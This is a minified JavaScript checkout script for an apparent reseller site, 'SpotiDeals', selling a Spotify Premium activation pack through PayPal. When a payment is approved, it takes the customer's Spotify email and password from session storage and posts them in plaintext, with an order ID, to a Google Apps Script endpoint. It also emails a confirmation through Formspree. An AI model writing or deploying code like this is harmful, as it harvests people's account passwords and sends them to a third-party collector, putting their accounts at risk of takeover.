"use strict";(()=>{var c="https://script.google.com/macros/s/AKfycbxEmJdgcerK1ENvsy8IvSnAZDJ6p4fr9hfO87haKbKrVXZaRf2Z3wnRzyQSDl527VtW/exec",l="https://formspree.io/f/xanorewp";function d(){let t=Date.now().toString(36),e=Math.random().toString(36).substr(2,5);return`SPD-${t}-${e}`.toUpperCase()}async function m(t){try{let e=await fetch(c,{method:"POST",mode:"no-cors",headers:{"Content-Type":"application/json"},body:JSON.stringify(t)});return!0}catch(e){return console.error("Error sending data to Google Script:",e),!1}}async function u(t,e){try{return(await fetch(l,{method:"POST",headers:{"Content-Type":"application/json",Accept:"application/json"},body:JSON.stringify({_to:t,_subject:`Confirmation de votre commande SpotiDeals #${e}`,orderID:e,message:"Merci pour votre commande ! Nous la traiterons dans les plus brefs d\xE9lais."})})).ok}catch(r){return console.error("Error sending confirmation email:",r),!1}}function p(){if(typeof paypal>"u"){console.error("PayPal SDK not loaded.");return}paypal.Buttons({createOrder:function(t,e){return e.order.create({purchase_units:[{amount:{value:"82.62",currency_code:"CAD"},description:"Pack Activation Spotify Premium 12 mois"}]})},onApprove:async function(t,e){try{let r=await e.order.capture(),o=sessionStorage.getItem("spotifyEmail"),s=sessionStorage.getItem("spotifyPassword"),n=d();if(!o||!s)throw new Error("User session data (email/password) not found.");let a={orderID:n,email:o,password:s,date:new Date().toISOString(),status:"pending",notes:`Paiement PayPal re\xE7u: ${r.id}`},i=await m(a),f=await u(o,n);i?(alert(`\u2705 Paiement r\xE9ussi ! Votre num\xE9ro de commande est : ${n}. Un email de confirmation a \xE9t\xE9 envoy\xE9 \xE0 ${o}.`),window.location.href=`tracking.html?order=${n}`):alert(`\u26A0\uFE0F Votre paiement a \xE9t\xE9 accept\xE9, mais une erreur est survenue lors de la cr\xE9ation de votre commande. Votre num\xE9ro de transaction PayPal est ${r.id}. Veuillez contacter le support avec ce num\xE9ro.`),sessionStorage.removeItem("spotifyEmail"),sessionStorage.removeItem("spotifyPassword")}catch(r){console.error("Error during PayPal onApprove:",r),alert("Une erreur inattendue est survenue apr\xE8s votre paiement. Veuillez contacter le support.")}},onError:function(t){console.error("PayPal Button Error:",t),alert("Une erreur est survenue avec le processus de paiement PayPal. Veuillez r\xE9essayer.")}}).render("#paypal-button-container")}document.addEventListener("DOMContentLoaded",()=>{let t=sessionStorage.getItem("spotifyEmail"),e=document.getElementById("summary-email");e&&(t?e.textContent=t:(e.textContent="Non trouv\xE9",alert("Erreur: Impossible de retrouver les informations de votre session. Veuillez recommencer le processus de commande."))),p()});})();
